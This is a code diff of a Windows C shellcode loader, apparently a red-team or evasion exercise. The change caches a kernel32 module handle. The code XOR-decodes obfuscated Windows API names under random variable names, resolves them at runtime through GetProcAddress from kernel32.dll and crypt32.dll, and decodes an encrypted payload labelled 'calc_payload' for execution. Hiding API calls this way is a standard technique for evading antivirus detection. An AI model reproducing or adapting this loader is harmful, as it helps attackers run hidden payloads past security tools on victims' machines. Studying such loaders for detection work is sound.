@@ -34,8 +34,9 @@ void XOR(char data[], int data_len, const char key[], int key_len){
 int main(void){
     void * exec_mem;
     DWORD decoded_data_len;
-	BOOL rv, fret, _fret;
-	HANDLE th;
+    BOOL rv, fret, _fret;
+    HANDLE th;
+    HMODULE k32;
     DWORD oldprotect = 0;
 
     char aOkBoNan_72[] = { 0x17, 0x2B, 0x31, 0x30, 0x30, 0x27, 0x2B, 0x9, 0x25, 0x26, 0x24, 0x2F, 0x00 };
@@ -45,7 +46,10 @@ int main(void){
     char MBmkUwSv_33[] = { 0x16, 0x23, 0x2a, 0x30, 0x3, 0x29, 0x35, 0x1b, 0x20, 0x24, 0x2c, 0x20, 0x28, 0x1, 0x2d, 0x3a, 0x34, 0x31, 0x27, 0x00 }; 
     char qUtERxmP_46[] = { 0x6, 0x27, 0x37, 0x8, 0x24, 0x35, 0x33, 0xd, 0x3b, 0x38, 0x24, 0x3e, 0x00};
     char uGkSPlIy_64[] = { 0x2, 0x30, 0x3a, 0x34, 0x31, 0x15, 0x33, 0x3a, 0x20, 0x24, 0x2c, 0x18, 0x22, 0xc, 0x26, 0x3e, 0x30, 0x20, 0x2a, 0x15, 0x00}; 
-    
+
+    // Get Module Handles
+    k32 = GetModuleHandle("kernel32.dll");
+
     XOR(aOkBoNan_72, sizeof(aOkBoNan_72)-1, xor_func_key,  strlen(xor_func_key));
     XOR(ZFpjwcEi_49, sizeof(ZFpjwcEi_49)-1, xor_func_key,  strlen(xor_func_key));
     XOR(wHTaasGM_65, sizeof(wHTaasGM_65)-1, xor_func_key,  strlen(xor_func_key));
@@ -55,14 +59,15 @@ int main(void){
     XOR(uGkSPlIy_64, sizeof(uGkSPlIy_64)-1, xor_func_key, strlen(xor_func_key));
     XOR(calc_payload, calc_len, xor_payload_key, strlen(xor_payload_key));
 
-    ADIlScUq_08 = GetProcAddress(GetModuleHandle("kernel32.dll"),  aOkBoNan_72);
-    XXffeVws_82 = GetProcAddress(GetModuleHandle("kernel32.dll"),  ZFpjwcEi_49);
-    GZxcXppJ_75 = GetProcAddress(GetModuleHandle("kernel32.dll"),  wHTaasGM_65);
-    YiVPMqdg_26 = GetProcAddress(GetModuleHandle("kernel32.dll"),  DUqpkuhG_07);
-    yLEXDxAY_48 = GetProcAddress(GetModuleHandle("kernel32.dll"),  MBmkUwSv_33);
-    paJDuEtY_86 = GetProcAddress(GetModuleHandle("kernel32.dll"),  qUtERxmP_46);
+
+    ADIlScUq_08 = GetProcAddress(k32, aOkBoNan_72);
+    XXffeVws_82 = GetProcAddress(k32, ZFpjwcEi_49);
+    GZxcXppJ_75 = GetProcAddress(k32, wHTaasGM_65);
+    YiVPMqdg_26 = GetProcAddress(k32, DUqpkuhG_07);
+    yLEXDxAY_48 = GetProcAddress(k32, MBmkUwSv_33);
+    paJDuEtY_86 = GetProcAddress(k32, qUtERxmP_46);
     djIKoshL_18 = GetProcAddress(LoadLibraryA("crypt32.dll"),  uGkSPlIy_64);
-    
+
     if(djIKoshL_18 == NULL){
         printf("Error!\n");
         return -1;
